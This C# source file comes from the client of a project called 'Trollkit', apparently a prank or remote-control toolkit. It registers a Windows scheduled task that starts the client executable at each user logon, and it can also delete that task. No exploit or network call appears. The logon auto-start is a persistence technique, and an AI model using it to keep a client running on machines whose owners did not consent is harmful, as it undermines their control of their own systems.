using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Principal;
using System.Text;
using TaskScheduler;
using Trollkit_Library;

namespace Trollkit_Client.Modules
{
	public class TaskSchedulerHelper
	{
		TaskScheduler.TaskScheduler objScheduler;
		ITaskDefinition objTaskDef;
		ILogonTrigger objTrigger;
		IExecAction objAction;

		/// <summary>
		/// Creates a task in the Windows TaskScheduler.
		/// The task runs the executable in the provided path parameter at user logon.
		/// </summary>
		/// <param name="path">path to executable</param>
		public void CreateTask(string path)
		{
			try
			{
				objScheduler = new TaskScheduler.TaskScheduler();
				objScheduler.Connect();

				SetTaskDefinition();
				SetTriggerInfo();
				SetActionInfo(path);

				ITaskFolder root = objScheduler.GetFolder("\\");
				IRegisteredTask regTask = root.RegisterTaskDefinition("Trollkit Client", objTaskDef, (int)_TASK_CREATION.TASK_CREATE_OR_UPDATE, null, null, _TASK_LOGON_TYPE.TASK_LOGON_INTERACTIVE_TOKEN, "");
			}
			catch (Exception ex)
			{
				BConsole.WriteLine(ex.Message, ConsoleColor.Red);
			}
		}

		/// <summary>
		/// Deletes the task for trollkit client from the taskscheduler
		/// </summary>
		/// <param name="sender"></param>
		/// <param name="e"></param>
		public void DeleteTask()
		{
			try
			{
				TaskScheduler.TaskScheduler objScheduler = new TaskScheduler.TaskScheduler();
				objScheduler.Connect();

				ITaskFolder containingFolder = objScheduler.GetFolder("\\");
				containingFolder.DeleteTask("Trollkit Client", 0);
			}
			catch (Exception ex)
			{
				BConsole.WriteLine(ex.Message, ConsoleColor.Red);
			}
		}

		/// <summary>
		/// Sets a task definition
		/// </summary>
		private void SetTaskDefinition()
		{
			try
			{
				objTaskDef = objScheduler.NewTask(0);
				objTaskDef.RegistrationInfo.Author = "Trollkit";
				objTaskDef.RegistrationInfo.Description = "Trollkit Client Start";
				objTaskDef.RegistrationInfo.Date = DateTime.Today.ToString("yyyy-MM-ddTHH:mm:ss"); //Date format 
				objTaskDef.Settings.Priority = 7;
				objTaskDef.Settings.Enabled = true;
				objTaskDef.Settings.Hidden = false;
				objTaskDef.Settings.RunOnlyIfNetworkAvailable = true;
			}
			catch (Exception ex)
			{
				BConsole.WriteLine(ex.Message, ConsoleColor.Red);
			}
		}

		/// <summary>
		/// Sets the trigger info for the task
		/// </summary>
		private void SetTriggerInfo()
		{
			try
			{
				objTrigger = (ILogonTrigger)objTaskDef.Triggers.Create(_TASK_TRIGGER_TYPE2.TASK_TRIGGER_LOGON);
				objTrigger.UserId = WindowsIdentity.GetCurrent().Name;
				objTrigger.Id = "Trollkit Trigger";
			}
			catch (Exception ex)
			{
				BConsole.WriteLine(ex.Message, ConsoleColor.Red);
			}
		}

		/// <summary>
		/// Sets the action info of the task to run
		/// </summary>
		/// <param name="exePath"></param>
		private void SetActionInfo(string exePath)
		{
			try
			{
				objAction = (IExecAction)objTaskDef.Actions.Create(_TASK_ACTION_TYPE.TASK_ACTION_EXEC);
				objAction.Id = "Trollkit boot action";
				objAction.Path = exePath;
			}
			catch (Exception ex)
			{
				BConsole.WriteLine(ex.Message, ConsoleColor.Red);
			}
		}
	}
}
